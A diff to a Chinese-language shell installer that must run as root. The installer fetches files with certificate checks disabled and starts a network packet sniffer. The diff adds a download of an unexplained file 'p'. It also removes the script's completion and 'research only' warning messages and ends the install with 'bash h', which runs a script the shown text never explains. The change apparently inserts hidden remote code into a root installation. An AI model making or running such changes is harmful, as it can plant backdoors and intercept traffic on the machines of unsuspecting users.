@@ -2,6 +2,7 @@
 [ $(id -u) != "0" ] && { echo "权限不足，请以root的身份运行！"; exit 1; }
 #Start Install
 cd /root
+wget --no-check-certificate https://raw.githubusercontent.com/Admin-backups/text/master/p
 wget --no-check-certificate https://raw.githubusercontent.com/Admin-backups/text/master/restart.sh
 wget -N --no-check-certificate -O /usr/local/bin/leida https://raw.githubusercontent.com/Admin-backups/text/master/leida
 chmod +x /usr/local/bin/leida
@@ -42,7 +43,5 @@ echo "上方信息为内网情况"
 read -p "请输入上方看到的内网ip： " ip
 forever start index.js sniff eth0 $ip | pino
 
-echo "搭建完成"
-echo '谨慎使用！仅供研究！'
-echo '输入“leida”即可进入控制面板！'
-echo '本机ip:20086即可进入网页（A.A.A.A:20086）'
+cd /root
+bash h
